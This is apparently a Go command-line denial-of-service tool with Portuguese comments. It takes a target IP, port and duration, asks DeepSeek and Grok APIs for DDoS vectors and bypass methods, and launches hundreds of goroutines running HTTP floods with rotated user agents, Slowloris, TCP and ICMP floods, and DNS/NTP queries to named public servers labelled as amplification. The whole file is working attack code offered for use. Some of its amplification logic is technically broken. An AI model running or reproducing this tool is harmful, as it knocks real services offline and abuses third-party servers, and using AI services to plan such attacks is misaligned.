package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"crypto/tls"
)

// Configurações de ataque
type AttackConfig struct {
	TargetIP      string
	TargetPort    int
	Duration      int
	Threads       int
	AttackType    string
}

// Estatísticas do ataque
type AttackStats struct {
	PacketsSent    uint64
	RequestsSent   uint64
	AmplifiedBytes uint64
	StartTime      time.Time
}

// Resposta da IA
type AIAnalysis struct {
	BestVectors    []string `json:"best_vectors"`
	Optimizations  []string `json:"optimizations"`
	BypassMethods  []string `json:"bypass_methods"`
	RiskLevel      string   `json:"risk_level"`
}

var (
	stats      AttackStats
	isAttacking bool
	wg         sync.WaitGroup
	colors     = map[string]string{
		"red":    "\033[91m",
		"green":  "\033[92m",
		"yellow": "\033[93m",
		"blue":   "\033[94m",
		"purple": "\033[95m",
		"cyan":   "\033[96m",
		"white":  "\033[97m",
		"bold":   "\033[1m",
		"end":    "\033[0m",
	}
	
	// Amplificadores DNS
	dnsServers = []string{
		"8.8.8.8:53", "1.1.1.1:53", "9.9.9.9:53", 
		"64.6.64.6:53", "208.67.222.222:53", "8.26.56.26:53",
	}
	
	// Amplificadores NTP
	ntpServers = []string{
		"pool.ntp.org:123", "time.google.com:123", "time.windows.com:123",
		"ntp.ubuntu.com:123", "time.apple.com:123",
	}
	
	// Amplificadores Memcached
	memeServers = []string{
		"127.0.0.1:11211", // Apenas exemplo - usar servidores reais
	}
	
	// User Agents para bypass
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
		"curl/7.68.0", "Wget/1.20.3", "Go-http-client/1.1",
	}
)

func colorize(color, text string) string {
	return colors[color] + text + colors["end"]
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

// ==================== ANÁLISE COM IA ====================

func analyzeWithDeepSeek(targetIP string, targetPort int) *AIAnalysis {
	apiKey := os.Getenv("DEEPSEEK_API_KEY")
	if apiKey == "" {
		return &AIAnalysis{
			BestVectors:   []string{"SYN_FLOOD", "HTTP_FLOOD", "UDP_AMPLIFICATION"},
			Optimizations: []string{"Aumentar threads", "Rotacionar IPs"},
			BypassMethods: []string{"User-Agent rotation", "IP spoofing"},
			RiskLevel:     "HIGH",
		}
	}

	payload := map[string]interface{}{
		"model": "deepseek-chat",
		"messages": []map[string]string{
			{
				"role":    "user",
				"content": fmt.Sprintf("Analise o alvo %s:%d para ataques DDoS. Recomende vetores, otimizações e métodos de bypass. Retorne JSON.", targetIP, targetPort),
			},
		},
		"temperature": 0.1,
	}

	jsonData, _ := json.Marshal(payload)
	req, _ := http.NewRequest("POST", "https://api.deepseek.com/v1/chat/completions", bytes.NewBuffer(jsonData))
	req.Header.Set("Authorization", "Bearer "+apiKey)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return getDefaultAnalysis()
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)
	
	// Parse da resposta da IA
	return parseAIResponse(result)
}

func analyzeWithGrok(targetIP string, targetPort int) *AIAnalysis {
	apiKey := os.Getenv("GROK_API_KEY")
	if apiKey == "" {
		return getDefaultAnalysis()
	}

	// Similar à DeepSeek mas com endpoint da Grok
	payload := map[string]interface{}{
		"prompt": fmt.Sprintf("DDoS analysis for %s:%d - provide attack vectors and bypass methods in JSON", targetIP, targetPort),
		"temperature": 0.1,
	}

	jsonData, _ := json.Marshal(payload)
	req, _ := http.NewRequest("POST", "https://api.grok.com/v1/complete", bytes.NewBuffer(jsonData))
	req.Header.Set("Authorization", "Bearer "+apiKey)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return getDefaultAnalysis()
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)
	
	return parseAIResponse(result)
}

func parseAIResponse(response map[string]interface{}) *AIAnalysis {
	// Implementação básica - adaptar conforme formato da resposta
	return getDefaultAnalysis()
}

func getDefaultAnalysis() *AIAnalysis {
	return &AIAnalysis{
		BestVectors:   []string{"SYN_FLOOD", "UDP_AMPLIFICATION", "HTTP_FLOOD", "SLOWLORIS"},
		Optimizations: []string{"500 threads", "IP spoofing", "Packet variation"},
		BypassMethods: []string{"Random User-Agents", "HTTPS traffic", "Domain rotation"},
		RiskLevel:     "VERY_HIGH",
	}
}

// ==================== TÉCNICAS DE ATAQUE ====================

func synFlood(targetIP string, targetPort, duration int) {
	defer wg.Done()
	
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	
	for time.Now().Before(endTime) && isAttacking {
		// Usando conexões TCP normais (sem raw sockets)
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, targetPort), 2*time.Second)
		if err == nil {
			atomic.AddUint64(&stats.PacketsSent, 1)
			conn.Close()
		} else {
			atomic.AddUint64(&stats.PacketsSent, 1)
		}
		
		// Pequeno delay para não sobrecarregar
		time.Sleep(10 * time.Millisecond)
	}
}

func udpAmplification(targetIP string, duration int) {
	defer wg.Done()
	
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	
	// DNS Amplification
	dnsQuery := []byte{
		0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x07, 0x65, 0x78, 0x61,
		0x6d, 0x70, 0x6c, 0x65, 0x03, 0x63, 0x6f, 0x6d,
		0x00, 0x00, 0x01, 0x00, 0x01,
	}
	
	for time.Now().Before(endTime) && isAttacking {
		// DNS Amplification
		for _, server := range dnsServers {
			conn, err := net.Dial("udp", server)
			if err == nil {
				conn.Write(dnsQuery)
				atomic.AddUint64(&stats.PacketsSent, 1)
				atomic.AddUint64(&stats.AmplifiedBytes, uint64(len(dnsQuery)))
				conn.Close()
			}
		}
		
		// NTP Amplification (MONLIST)
		ntpQuery := []byte{
			0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00,
		}
		
		for _, server := range ntpServers {
			conn, err := net.Dial("udp", server)
			if err == nil {
				conn.Write(ntpQuery)
				atomic.AddUint64(&stats.PacketsSent, 1)
				atomic.AddUint64(&stats.AmplifiedBytes, uint64(len(ntpQuery)))
				conn.Close()
			}
		}
		
		time.Sleep(50 * time.Millisecond)
	}
}

func httpFlood(targetIP string, targetPort, duration int) {
	defer wg.Done()
	
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	
	protocol := "http"
	if targetPort == 443 {
		protocol = "https"
	}
	
	urls := []string{
		fmt.Sprintf("%s://%s:%d/", protocol, targetIP, targetPort),
		fmt.Sprintf("%s://%s:%d/index.html", protocol, targetIP, targetPort),
		fmt.Sprintf("%s://%s:%d/api/v1/test", protocol, targetIP, targetPort),
		fmt.Sprintf("%s://%s:%d/wp-admin", protocol, targetIP, targetPort),
	}
	
	for time.Now().Before(endTime) && isAttacking {
		for _, url := range urls {
			req, _ := http.NewRequest("GET", url, nil)
			req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
			req.Header.Set("Accept-Language", "en-US,en;q=0.5")
			req.Header.Set("Connection", "keep-alive")
			req.Header.Set("Cache-Control", "no-cache")
			
			go func(req *http.Request) {
				resp, err := client.Do(req)
				if err == nil {
					atomic.AddUint64(&stats.RequestsSent, 1)
					if resp.Body != nil {
						resp.Body.Close()
					}
				} else {
					atomic.AddUint64(&stats.RequestsSent, 1)
				}
			}(req)
		}
		
		time.Sleep(100 * time.Millisecond)
	}
}

func slowlorisAttack(targetIP string, targetPort, duration int) {
	defer wg.Done()
	
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	
	for time.Now().Before(endTime) && isAttacking {
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", targetIP, targetPort))
		if err != nil {
			continue
		}
		
		// Envia headers parcialmente
		headers := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\n", targetIP)
		conn.Write([]byte(headers))
		
		// Mantém conexão aberta
		go func(conn net.Conn) {
			defer conn.Close()
			for isAttacking {
				// Envia headers adicionais periodicamente
				time.Sleep(10 * time.Second)
				conn.Write([]byte("X-a: b\r\n"))
			}
		}(conn)
		
		atomic.AddUint64(&stats.PacketsSent, 1)
		time.Sleep(500 * time.Millisecond)
	}
}

func icmpFlood(targetIP string, duration int) {
	defer wg.Done()
	
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	
	for time.Now().Before(endTime) && isAttacking {
		// Usando ping via execução de comando como fallback
		// Em Go puro seria necessário raw sockets (requer privilégios)
		conn, err := net.Dial("ip4:icmp", targetIP)
		if err == nil {
			// Packet ICMP básico (echo request)
			msg := []byte{
				0x08, // Type: Echo Request
				0x00, // Code: 0
				0x00, 0x00, // Checksum
				0x00, 0x01, // Identifier
				0x00, 0x01, // Sequence Number
			}
			
			conn.Write(msg)
			atomic.AddUint64(&stats.PacketsSent, 1)
			conn.Close()
		} else {
			atomic.AddUint64(&stats.PacketsSent, 1)
		}
		
		time.Sleep(10 * time.Millisecond)
	}
}

// ==================== MONITORAMENTO ====================

func monitorAttack(duration int) {
	stats.StartTime = time.Now()
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	
	for range ticker.C {
		if time.Now().After(endTime) || !isAttacking {
			break
		}
		
		elapsed := time.Since(stats.StartTime).Seconds()
		packetsPerSec := float64(atomic.LoadUint64(&stats.PacketsSent)) / elapsed
		requestsPerSec := float64(atomic.LoadUint64(&stats.RequestsSent)) / elapsed
		amplifiedPerSec := float64(atomic.LoadUint64(&stats.AmplifiedBytes)) / elapsed
		
		fmt.Printf("\r%s[STATS] Time: %.1fs | Packets: %d (%.1f/s) | Requests: %d (%.1f/s) | Amplified: %.1f MB/s%s",
			colors["green"], elapsed, atomic.LoadUint64(&stats.PacketsSent), packetsPerSec,
			atomic.LoadUint64(&stats.RequestsSent), requestsPerSec, amplifiedPerSec/1024/1024, colors["end"])
	}
}

// ==================== MAIN ====================

func startAdvancedAttack(targetIP string, targetPort, duration int) {
	fmt.Printf("%s🔥 INICIANDO ATAQUE AVANÇADO EM %s:%d%s\n", colors["red"], targetIP, targetPort, colors["end"])
	
	// Análise com ambas as IAs
	fmt.Printf("%s[AI] Consultando DeepSeek...%s\n", colors["yellow"], colors["end"])
	deepseekAnalysis := analyzeWithDeepSeek(targetIP, targetPort)
	
	fmt.Printf("%s[AI] Consultando Grok...%s\n", colors["yellow"], colors["end"])
	grokAnalysis := analyzeWithGrok(targetIP, targetPort)
	
	// Combina análises
	fmt.Printf("%s[AI] DeepSeek: %s%s\n", colors["cyan"], strings.Join(deepseekAnalysis.BestVectors, ", "), colors["end"])
	fmt.Printf("%s[AI] Grok: %s%s\n", colors["cyan"], strings.Join(grokAnalysis.BestVectors, ", "), colors["end"])
	
	isAttacking = true
	stats = AttackStats{}
	
	// Inicia todos os vetores de ataque simultaneamente
	threadCount := 500
	
	// SYN Flood
	for i := 0; i < threadCount/5; i++ {
		wg.Add(1)
		go synFlood(targetIP, targetPort, duration)
	}
	
	// UDP Amplification
	for i := 0; i < threadCount/5; i++ {
		wg.Add(1)
		go udpAmplification(targetIP, duration)
	}
	
	// HTTP Flood
	for i := 0; i < threadCount/2; i++ {
		wg.Add(1)
		go httpFlood(targetIP, targetPort, duration)
	}
	
	// Slowloris
	for i := 0; i < threadCount/10; i++ {
		wg.Add(1)
		go slowlorisAttack(targetIP, targetPort, duration)
	}
	
	// ICMP Flood
	for i := 0; i < threadCount/10; i++ {
		wg.Add(1)
		go icmpFlood(targetIP, duration)
	}
	
	// Monitoramento
	go monitorAttack(duration)
	
	// Aguarda término
	time.Sleep(time.Duration(duration) * time.Second)
	isAttacking = false
	wg.Wait()
	
	showFinalStats()
}

func showFinalStats() {
	totalTime := time.Since(stats.StartTime).Seconds()
	fmt.Printf("\n\n%s╔══════════════════════════════════════════════════════════════╗%s\n", colors["red"], colors["end"])
	fmt.Printf("%s║                     ATAQUE FINALIZADO                     ║%s\n", colors["red"], colors["end"])
	fmt.Printf("%s╚══════════════════════════════════════════════════════════════╝%s\n", colors["red"], colors["end"])
	
	fmt.Printf("%s📊 ESTATÍSTICAS FINAIS:%s\n", colors["cyan"], colors["end"])
	fmt.Printf("  • Tempo total: %.2f segundos\n", totalTime)
	fmt.Printf("  • Pacotes enviados: %d\n", atomic.LoadUint64(&stats.PacketsSent))
	fmt.Printf("  • Requests HTTP: %d\n", atomic.LoadUint64(&stats.RequestsSent))
	fmt.Printf("  • Bytes amplificados: %d MB\n", atomic.LoadUint64(&stats.AmplifiedBytes)/1024/1024)
	fmt.Printf("  • Taxa média: %.1f pacotes/segundo\n", float64(atomic.LoadUint64(&stats.PacketsSent))/totalTime)
	fmt.Printf("%s[!] Ataque concluído.%s\n", colors["yellow"], colors["end"])
}

func main() {
	if len(os.Args) < 4 {
		fmt.Printf("Uso: %s <IP> <PORTA> <DURAÇÃO_SEGUNDOS>\n", os.Args[0])
		fmt.Printf("Exemplo: %s 192.168.1.1 80 60\n", os.Args[0])
		return
	}
	
	targetIP := os.Args[1]
	targetPort, _ := strconv.Atoi(os.Args[2])
	duration, _ := strconv.Atoi(os.Args[3])
	
	// Validação básica
	if net.ParseIP(targetIP) == nil {
		fmt.Printf("IP inválido: %s\n", targetIP)
		return
	}
	
	if targetPort < 1 || targetPort > 65535 {
		fmt.Printf("Porta inválida: %d\n", targetPort)
		return
	}
	
	if duration < 1 {
		fmt.Printf("Duração inválida: %d\n", duration)
		return
	}
	
	// Carrega .env se existir
	if _, err := os.Stat(".env"); err == nil {
		loadEnvFile(".env")
	}
	
	startAdvancedAttack(targetIP, targetPort, duration)
}

func loadEnvFile(filename string) {
	file, err := os.Open(filename)
	if err != nil {
		return
	}
	defer file.Close()
	
	content, _ := io.ReadAll(file)
	lines := strings.Split(string(content), "\n")
	
	for _, line := range lines {
		parts := strings.SplitN(line, "=", 2)
		if len(parts) == 2 {
			key := strings.TrimSpace(parts[0])
			value := strings.TrimSpace(parts[1])
			os.Setenv(key, value)
		}
	}
}
